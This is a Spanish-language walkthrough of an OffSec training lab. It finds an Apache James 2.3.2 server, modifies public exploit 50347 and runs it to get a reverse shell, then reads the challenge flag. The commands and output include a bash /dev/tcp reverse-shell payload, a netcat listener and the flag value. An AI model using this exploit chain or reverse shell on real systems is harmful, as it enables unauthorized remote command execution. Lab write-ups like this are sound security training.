# Walk: Capstonte

## Fecha: 10/06/2025
## Host: 
## IP: {IP}
## Objetivo
Capstone Lab: An exploitable server is running services on several ports on the exercise VM, PublicExploits03. 
Treat this like a real box and start by identifying what services are running. There is a local user student on this box with the password **lab**. 
Exploit the vulnerable service and SSH to the box to read flag.txt located in /home/challenge/.
## Herramientas
1. tool - 1 
2. tool - 2
## Procedimiento y comandos
#### Paso 1: Enumeramos el servidor:
```bash
┌──(root㉿kali)-[/home/kali/OffSec/x-LocatingPublicExploits/capstone]
└─# nmap -sV -p- -T4 192.168.161.52 -oN 52-all-ports-services.txt

Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-10 10:40 -03
Nmap scan report for 192.168.161.52
Host is up (0.15s latency).
Not shown: 65529 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 8.4p1 Ubuntu 5ubuntu1.2 (Ubuntu Linux; protocol 2.0)
32822/tcp open  james-admin JAMES Remote Admin 2.3.2
32823/tcp open  nntp        JAMES nntpd (posting ok)
32824/tcp open  pop3        JAMES pop3d 2.3.2
32825/tcp open  smtp        JAMES smtpd 2.3.2
32826/tcp open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
Service Info: Host: f0fe9b8513cd; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 781.78 seconds

```
#### Paso 2: Buscamos el exploit:
```bash
──(root㉿kali)-[/home/kali/OffSec/x-LocatingPublicExploits/capstone]
└─# searchsploit Apache James Server 2.3.2                       
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                  |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Apache James Server 2.3.2 - Insecure User Creation Arbitrary File Write (Metasploit)                                                                                            | linux/remote/48130.rb
Apache James Server 2.3.2 - Remote Command Execution                                                                                                                            | linux/remote/35513.py
Apache James Server 2.3.2 - Remote Command Execution (RCE) (Authenticated) (2)                                                                                                  | linux/remote/50347.py
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
#### Paso 3: Generamos el mirror:
```bash
┌──(root㉿kali)-[/home/kali/OffSec/x-LocatingPublicExploits/capstone]
└─# searchsploit -m 50347                  
  Exploit: Apache James Server 2.3.2 - Remote Command Execution (RCE) (Authenticated) (2)
      URL: https://www.exploit-db.com/exploits/50347
     Path: /usr/share/exploitdb/exploits/linux/remote/50347.py
    Codes: N/A
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/kali/OffSec/x-LocatingPublicExploits/capstone/50347.py
```

#### Paso 4: Modificamos el exploit a nuestras necesidades:

> Modificamos los puertos 

* s.connect((remote_ip,32822)) # Remote Administration Tool
* s.connect((remote_ip,32825))  # SMTP Server

#### Paso 5: Subimos el exploit por ssh al usuario student y lo ejecutamos, con un receptor nc en nuestro kali:

- Student:

```bash
student@f0fe9b8513cd:~$ wget http://192.168.45.239:8000/50347.py
--2025-06-10 14:53:23--  http://192.168.45.239:8000/50347.py
Connecting to 192.168.45.239:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4581 (4.5K) [text/x-python]
Saving to: ‘50347.py’

50347.py                                             100%[====================================================================================================================>]   4.47K  --.-KB/s    in 0s      

2025-06-10 14:53:24 (549 MB/s) - ‘50347.py’ saved [4581/4581]

student@f0fe9b8513cd:~$ chmod +x 50347.py
student@f0fe9b8513cd:~$ python3 50347.py 192.168.161.52 192.168.45.239 4444
[+]Payload Selected (see script for more options):  /bin/bash -i >& /dev/tcp/192.168.45.239/4444 0>&1
[+]Example netcat listener syntax to use after successful execution: nc -lvnp 4444
[+]Connecting to James Remote Administration Tool...
[+]Creating user...
[+]Connecting to James SMTP server...
[+]Sending payload...
[+]Done! Payload will be executed once somebody logs in (i.e. via SSH).
[+]Don't forget to start a listener on port 4444 before logging in!
student@f0fe9b8513cd:~$
```

- kali:

```bash
┌──(root㉿kali)-[/home/kali/OffSec/x-LocatingPublicExploits/capstone]
└─# nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.45.239] from (UNKNOWN) [192.168.161.52] 37188
challenge@f0fe9b8513cd:~$ ls
ls
flag.txt
challenge@f0fe9b8513cd:~$ cat flag.txt
cat flag.txt
Congrats. Here is your flag, brought to you by the great Ronald Dahl:

OS{10579a8973d8fc1ddd429a84000c189c}
challenge@f0fe9b8513cd:~$   
```

